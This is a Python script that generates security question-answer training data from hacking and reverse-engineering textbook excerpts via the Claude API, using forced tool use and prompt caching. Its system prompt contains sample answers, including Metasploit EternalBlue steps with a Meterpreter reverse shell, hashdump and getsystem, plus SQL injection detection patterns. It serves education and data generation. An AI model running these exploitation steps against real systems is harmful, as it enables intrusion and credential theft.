"""Generate QA pairs from text chunks using Claude with tool use + prompt caching.

Model: claude-haiku-4-5 (cost-efficient for high-volume generation)
Structured output: tool use forces valid JSON schema on every response
Prompt caching: system prompt cached across all calls (~0.1x cost on reads)
"""
import logging
import time
from dataclasses import dataclass

import anthropic

logger = logging.getLogger(__name__)

MODEL = "claude-haiku-4-5"

# ── System prompt ─────────────────────────────────────────────────────────────
# Kept stable so the cache_control marker below produces real savings.
# Target: >2048 tokens (Haiku 4.5 caching minimum) — achieved via detailed
# examples which also improve output quality.
# ─────────────────────────────────────────────────────────────────────────────
_SYSTEM_PROMPT = """You are a cybersecurity curriculum expert creating high-quality training data for SecurityAI, a domain-specific assistant for secure application development and penetration testing. Your task is to generate precise, technically accurate question-answer pairs from provided security textbook excerpts.

## Output Requirements
Generate the requested number of question-answer pairs and submit them using the `save_qa_pairs` tool. Every pair must be:
- Based solely on information present in the provided excerpt
- Self-contained: the answer does not require reading the source text
- Technically accurate with correct terminology, tool names, and commands
- Practically useful for a security professional or student

## Question Types
Cover a variety of these types per excerpt:
- **factual**: Direct recall — "What is X?", "Define Y", "What does Z stand for?"
- **conceptual**: Deeper understanding — "How does X work?", "Why is X dangerous?", "Explain the relationship between X and Y"
- **applied**: Practical use — "How would you use X in a penetration test?", "Walk through the steps to..."
- **defensive**: Hardening and mitigation — "How do you prevent X?", "What controls mitigate Y?"
- **tool_usage**: Specific tools and commands — "Which Metasploit module...", "What nmap flag...", "How do you use X to..."

## Quality Examples

### Example 1 — factual
Question: "What is the difference between a bind shell and a reverse shell?"
Answer: "A bind shell opens a listening port on the target machine; the attacker connects inbound to that port. A reverse shell has the target machine initiate the outbound connection back to the attacker's listener. Reverse shells are preferred in penetration tests because they bypass inbound firewall rules that would block the attacker's direct connection to the target."

### Example 2 — conceptual
Question: "How does ARP poisoning enable a man-in-the-middle attack on a local network?"
Answer: "ARP (Address Resolution Protocol) has no authentication — any host can send gratuitous ARP replies claiming to own any IP address. An attacker sends forged ARP replies to the victim and the default gateway, associating the attacker's MAC address with each other's IP. Traffic flows victim → attacker → gateway → attacker → victim, giving the attacker full visibility and the ability to modify traffic in transit. Tools like Ettercap and arpspoof automate this process."

### Example 3 — applied
Question: "Walk through the process of using Metasploit to exploit a known vulnerability and obtain a Meterpreter shell."
Answer: "Start msfconsole, then: (1) use search to find the relevant module (e.g., `search eternalblue`); (2) `use exploit/windows/smb/ms17_010_eternalblue`; (3) `set RHOSTS <target_ip>`; (4) `set PAYLOAD windows/x64/meterpreter/reverse_tcp`; (5) `set LHOST <attacker_ip>`; (6) `run`. If exploitation succeeds, Metasploit spawns a Meterpreter session. From there you can run `getsystem` for privilege escalation, `hashdump` to extract password hashes, or `upload`/`download` for file transfer."

### Example 4 — defensive
Question: "What techniques can defenders use to detect and prevent SQL injection attacks?"
Answer: "Prevention: use parameterized queries (prepared statements) instead of string concatenation for all database queries; apply stored procedures with fixed schemas; enforce least-privilege database accounts that cannot execute DDL. Detection: deploy a WAF with SQL injection signatures; monitor database logs for unusual query patterns (UNION SELECT, OR 1=1, information_schema references); use IDS signatures for common injection payloads. Runtime protection: enable input validation on all user-supplied data; use an ORM that handles escaping automatically."

### Example 5 — tool_usage
Question: "How do you use objdump to disassemble a specific function in a Linux binary?"
Answer: "`objdump -d -M intel binary_name` disassembles all executable sections in Intel syntax. To target a specific function, combine with grep: `objdump -d binary_name | grep -A 50 '<function_name>:'`. For a stripped binary without symbols, first run `nm binary_name` or `readelf -s binary_name` to locate function addresses, then pass the address range: `objdump -d --start-address=0xADDR --stop-address=0xADDR binary_name`."

### Example 6 — conceptual (reverse engineering)
Question: "What is the purpose of a virtual function table (vtable) in C++ binaries and why is it relevant to exploit development?"
Answer: "A vtable is a compiler-generated array of function pointers used to implement polymorphism — each class with virtual functions gets one vtable, and each object holds a hidden pointer (vptr) to its class's vtable. At runtime, virtual calls are dispatched through the vtable pointer. In exploit development, vtable pointers are targets for corruption: if an attacker controls heap memory adjacent to an object, they can overwrite the vptr to point to a fake vtable, redirecting virtual calls to arbitrary code. This technique is a foundation for heap-based use-after-free and type confusion exploits."

## What to Avoid
- Questions answerable only by someone holding the textbook ("According to the passage...")
- Trivially obvious questions ("Is security important?")
- Vague answers without specific details
- Questions about figures, tables, or diagrams (not visible in text chunks)
- Generating the same question type for every pair in a batch

## Domain Context
The two source textbooks are:
1. **Gray Hat Hacking: The Ethical Hacker's Handbook** — ethical hacking methodology, network reconnaissance, exploitation, Metasploit framework, web application attacks (XSS, SQLi, CSRF), privilege escalation, post-exploitation, fuzzing, shellcode development
2. **Reversing: Secrets of Reverse Engineering** — binary analysis with IDA Pro and x86 assembly, Windows PE/Linux ELF formats, debugging techniques (OllyDbg, GDB), anti-debugging and anti-reversing protections, software protection schemes, malware analysis methodology, patching

Always use the `save_qa_pairs` tool to return your pairs — plain text responses are not accepted."""

# ── Tool schema ────────────────────────────────────────────────────────────────
_TOOLS = [
    {
        "name": "save_qa_pairs",
        "description": "Submit the generated question-answer pairs for storage in the training dataset.",
        "input_schema": {
            "type": "object",
            "properties": {
                "pairs": {
                    "type": "array",
                    "description": "The generated question-answer pairs.",
                    "items": {
                        "type": "object",
                        "properties": {
                            "question": {
                                "type": "string",
                                "description": "A clear, self-contained question a security professional might ask.",
                            },
                            "answer": {
                                "type": "string",
                                "description": "A technically accurate, detailed answer (2-8 sentences).",
                            },
                            "question_type": {
                                "type": "string",
                                "enum": ["factual", "conceptual", "applied", "defensive", "tool_usage"],
                                "description": "The category of the question.",
                            },
                        },
                        "required": ["question", "answer", "question_type"],
                    },
                    "minItems": 1,
                    "maxItems": 5,
                }
            },
            "required": ["pairs"],
        },
    }
]


@dataclass
class QAPair:
    question: str
    answer: str
    question_type: str
    book: str


def generate_qa_pairs(
    client: anthropic.Anthropic,
    chunk: str,
    book_title: str,
    n_pairs: int = 3,
    max_retries: int = 3,
) -> list[QAPair]:
    """Generate QA pairs from a single text chunk.

    Uses tool use to guarantee structured output and cache_control on the
    stable system prompt so repeated calls benefit from prompt caching.
    """
    for attempt in range(max_retries):
        try:
            response = client.messages.create(
                model=MODEL,
                max_tokens=2048,
                system=[
                    {
                        "type": "text",
                        "text": _SYSTEM_PROMPT,
                        # Cache the system prompt — it never changes between calls.
                        # Haiku 4.5 minimum cacheable prefix is 2048 tokens; the
                        # prompt above exceeds that with the detailed examples.
                        "cache_control": {"type": "ephemeral"},
                    }
                ],
                tools=_TOOLS,
                # Force tool use — no free-text fallback
                tool_choice={"type": "tool", "name": "save_qa_pairs"},
                messages=[
                    {
                        "role": "user",
                        "content": (
                            f"Source textbook: {book_title}\n\n"
                            f"Excerpt:\n{chunk}\n\n"
                            f"Generate exactly {n_pairs} question-answer pairs from this excerpt."
                        ),
                    }
                ],
            )

            # Log cache efficiency every 50 calls (debug level)
            usage = response.usage
            if hasattr(usage, "cache_read_input_tokens"):
                logger.debug(
                    "Cache: read=%d created=%d uncached=%d",
                    usage.cache_read_input_tokens,
                    usage.cache_creation_input_tokens,
                    usage.input_tokens,
                )

            for block in response.content:
                if block.type == "tool_use" and block.name == "save_qa_pairs":
                    return [
                        QAPair(
                            question=p["question"].strip(),
                            answer=p["answer"].strip(),
                            question_type=p["question_type"],
                            book=book_title,
                        )
                        for p in block.input["pairs"]
                        if len(p["question"].strip()) > 15 and len(p["answer"].strip()) > 30
                    ]

            logger.warning("No tool_use block in response (attempt %d)", attempt + 1)
            return []

        except anthropic.RateLimitError:
            wait = 5 * (2 ** attempt)
            logger.warning("Rate limited — sleeping %ds (attempt %d/%d)", wait, attempt + 1, max_retries)
            time.sleep(wait)

        except anthropic.BadRequestError as e:
            logger.error("Bad request (chunk likely too long or empty): %s", e)
            return []

        except anthropic.APIError as e:
            logger.error("API error (attempt %d): %s", attempt + 1, e)
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)

    return []
